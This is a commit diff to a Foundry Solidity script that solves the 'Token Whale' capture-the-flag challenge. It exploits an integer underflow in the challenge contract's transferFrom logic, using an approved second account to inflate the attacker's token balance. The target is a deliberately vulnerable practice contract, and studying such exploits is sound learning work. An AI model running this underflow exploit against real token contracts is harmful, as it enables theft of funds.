5915464624e70e8b3fc4526bbb77476d435be844
jatin <jatinj615@gmail.com>
2022-09-04 16:43:03 +0530

    fix: token whale solution

--- script/math-challenge/TokenWhale.s.sol
+++ script/math-challenge/TokenWhale.s.sol
@@ -7,17 +7,19 @@ contract MyScript is Script {
 
     function run() public {
         
-        vm.startBroadcast();
-        
-        TokenWhaleChallenge twc = TokenWhaleChallenge(0x39FCc453700ECbaDBb30d452cAfd3cc435e27187);
-
+        // provide private keys for both accounts
         address attacker = 0xF5E1cA50Da44bF3CD71856Eb861Bda320AfFd396;
         address support = 0xC369EAA87c60cAad17BDB5A59e4dEDF43A69ED27;
+        
+        vm.startBroadcast(attacker);
+        
+        TokenWhaleChallenge twc = new TokenWhaleChallenge(attacker);
+
         twc.approve(support, type(uint256).max);
 
         vm.stopBroadcast();
 
-        vm.startBroadcast(0xC369EAA87c60cAad17BDB5A59e4dEDF43A69ED27);
+        vm.startBroadcast(support);
         twc.transferFrom(attacker, attacker, 1);
         twc.transfer(attacker, 1000000);
 
